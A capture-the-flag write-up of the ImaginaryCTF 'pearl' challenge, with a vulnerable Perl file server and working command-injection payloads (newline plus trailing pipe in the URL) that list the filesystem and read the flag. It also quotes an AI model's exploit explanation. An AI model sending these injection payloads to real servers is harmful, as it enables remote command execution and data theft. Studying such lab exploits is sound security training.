# pearl

```
by Eth007
Description

I used perl to make my pearl shop. Soon, we will expand to selling Perler bead renditions of Perlin noise.

http://pearl.chal.imaginaryctf.org
Attachments

pearl.zip
```

A perl server is provided in attachment:

```perl
#!/usr/bin/perl

use strict;
use warnings;
use HTTP::Daemon;
use HTTP::Status;
use File::Spec;
use File::MimeInfo::Simple;  # cpan install File::MimeInfo::Simple
use File::Basename;
use CGI qw(escapeHTML);

my $webroot = "./files";

my $d = HTTP::Daemon->new(LocalAddr => '0.0.0.0', LocalPort => 8080, Reuse => 1) || die "Failed to start server: $!";

print "Server running at: ", $d->url, "\n";

while (my $c = $d->accept) {
    while (my $r = $c->get_request) {
        if ($r->method eq 'GET') {
            my $path = CGI::unescape($r->uri->path);
            $path =~ s|^/||;     # Remove leading slash
            $path ||= 'index.html';

            my $fullpath = File::Spec->catfile($webroot, $path);

            if ($fullpath =~ /\.\.|[,\`\)\(;&]|\|.*\|/) {
                $c->send_error(RC_BAD_REQUEST, "Invalid path");
                next;
            }

            if (-d $fullpath) {
                # Serve directory listing
                opendir(my $dh, $fullpath) or do {
                    $c->send_error(RC_FORBIDDEN, "Cannot open directory.");
                    next;
                };

                my @files = readdir($dh);
                closedir($dh);

                my $html = "<html><body><h1>Index of /$path</h1><ul>";
                foreach my $f (@files) {
                    next if $f =~ /^\./;  # Skip dotfiles
                    my $link = "$path/$f";
                    $link =~ s|//|/|g;
                    $html .= qq{<li><a href="/$link">} . escapeHTML($f) . "</a></li>";
                }
                $html .= "</ul></body></html>";

                my $resp = HTTP::Response->new(RC_OK);
                $resp->header("Content-Type" => "text/html");
                $resp->content($html);
                $c->send_response($resp);

            } else {
                open(my $fh, $fullpath) or do {
                    $c->send_error(RC_INTERNAL_SERVER_ERROR, "Could not open file.");
                    next;
                };
                binmode $fh;
                my $content = do { local $/; <$fh> };
                close $fh;

                my $mime = 'text/html';

                my $resp = HTTP::Response->new(RC_OK);
                $resp->header("Content-Type" => $mime);
                $resp->content($content);
                $c->send_response($resp);
            }
        } else {
            $c->send_error(RC_METHOD_NOT_ALLOWED);
        }
    }
    $c->close;
    undef($c);
}
```

There are some filters applied:

```perl
my $path = CGI::unescape($r->uri->path);
$path =~ s|^/||;     # Remove leading slash
$path ||= 'index.html';

my $fullpath = File::Spec->catfile($webroot, $path);

if ($fullpath =~ /\.\.|[,\`\)\(;&]|\|.*\|/) {
    $c->send_error(RC_BAD_REQUEST, "Invalid path");
    next;
}
```

So we need to circumvent the filter and run command by:

1. adding newline `%0A` to strip `files/` prefix
2. use `|` (%7C) to let perl execute command instead of reading the file: `ls /|` gives the output of `ls /`

Attack:

```shell
$ curl http://pearl.chal.imaginaryctf.org/%0Als%20/%7C
app
bin
boot
dev
etc
flag-8ede8d4419fba13690098d0df565f495.txt
home
kctf
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ curl "http://pearl.chal.imaginaryctf.org/%0Acat%20/flag-8ede8d4419fba13690098d0df565f495
.txt%7C"
ictf{uggh_why_do_people_use_perl_1f023b129a22}
```

The attach is inspired by DeepSeek:

```
The provided Perl code for the HTTP server has a vulnerability that allows command injection through the `open` function when the path ends with a pipe character (`|`). This is because the `open` function in Perl interprets a filename ending with a pipe as a command to execute, reading the output of that command.

The blacklist filter in the code blocks certain characters (e.g., `..`, `,`, `` ` ``, `)`, `(`, `;`, `&`, and `|...|`), but it does not block a single pipe at the end of the path. Additionally, newlines (`%0A`) and comment characters (`#`) are not blocked, allowing for shell command injection.

To exploit this, send a GET request with a path that includes a newline followed by a command (e.g., `cat /flag.txt`), a comment character to ignore the rest of the string, and a pipe at the end. The URL-encoded path is `/%0Acat%20/flag.txt%20%23%20%7C`.

### Example Request:

GET /%0Acat%20/flag.txt%20%23%20%7C HTTP/1.1
Host: vulnerable-server.com

This will execute the command `cat /flag.txt` and return its output in the HTTP response, revealing the flag.

### Explanation:
- `%0A` is a newline, which allows multiple commands to be executed in the shell.
- `cat /flag.txt` is the command to read the flag file (adjust the path if necessary).
- `%23` is `#`, which comments out the remaining string (including the webroot path prefix).
- `%7C` is `|`, which triggers the command injection in the `open` function.

Ensure the flag file exists at `/flag.txt`; if not, use other commands like `ls` to explore the file system first.
```

The extra `#` is not required.
